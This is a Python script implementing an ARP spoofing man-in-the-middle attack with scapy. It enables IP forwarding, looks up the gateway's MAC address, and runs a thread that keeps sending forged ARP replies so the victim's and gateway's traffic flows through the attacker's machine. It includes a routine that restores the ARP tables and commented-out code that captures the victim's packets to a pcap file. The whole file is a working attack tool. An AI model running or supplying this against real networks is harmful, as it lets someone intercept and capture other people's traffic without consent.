#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Date : 2018-05-14 23:09
# @AUTHOR : thang
import signal
import threading
from netifaces import AF_INET

import arpreq

import atexit
from scapy.all import *

conf.iface = "wlo1"
conf.verb = 0


class ArpSpoofing:
    def __init__(self, target_ip, target_mac, gateway_ip=None):
        self.logger = logging.getLogger(__name__)
        if gateway_ip is None:
            gateway_ip = netifaces.gateways()['default'][AF_INET][1]
        self.gateway_ip = gateway_ip
        self.gateway_mac = arpreq.arpreq(gateway_ip)
        if self.gateway_mac is None:
            raise IOError("Unable to get gateway MAC address")
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.__running = True
        atexit.register(self.stop)

    def start(self):
        self._toggle_ip_forwarding(True)
        # ARP poison thread
        self.__running = True
        poison_thread = threading.Thread(target=self.arp_poison,
                                         args=(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac))
        poison_thread.start()
        # sniff_filter = "ip host " + self.target_ip
        # print("[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
        # packets = sniff(filter=sniff_filter, iface=conf.iface, count=1000)
        # wrpcap(self.target_ip + "_capture.pcap", packets)
        # print("[*] Stopping network capture..Restoring network")

    def stop(self):
        self.__running = False
        self.restore_network(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
        pass

    def arp_poison(self, gateway_ip, gateway_mac, target_ip, target_mac):
        """
        Keep sending false ARP replies to put our machine in the middle to intercept packets.
        This will use our interface MAC address as the hwsrc for the ARP reply
        :param gateway_ip: Gateway IP
        :param gateway_mac: Gateway MAC address
        :param target_ip: Target IP (victim IP)
        :param target_mac: Target MAC (victim MAC)
        :return: nothing
        """
        self.logger.info("Started ARP poison attack")

        while self.__running:
            send(ARP(op="is-at", pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)

    def _toggle_ip_forwarding(self, is_enable):
        """
        Setup IP forwarding
        :param is_enable: True if enable and False if disable
        :return:
        """
        if is_enable is True:
            value = 1
            self.logger.info("Enabling IP forwarding")
        else:
            value = 0
            self.logger.info("Disabling IP forwarding")
        os.system("sysctl -w net.ipv4.ip_forward={}".format(value))

    def restore_network(self, gateway_ip, gateway_mac, target_ip, target_mac):
        """
        Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
        correct MAC and IP Address information
        :param gateway_ip: Gateway IP
        :param gateway_mac: Gateway MAC address
        :param target_ip: Target IP (victim IP)
        :param target_mac: Target MAC (victim MAC)
        :return: nothing
        """
        send(ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
        # Disable IP Forwarding on a MAC
        self._toggle_ip_forwarding(False)
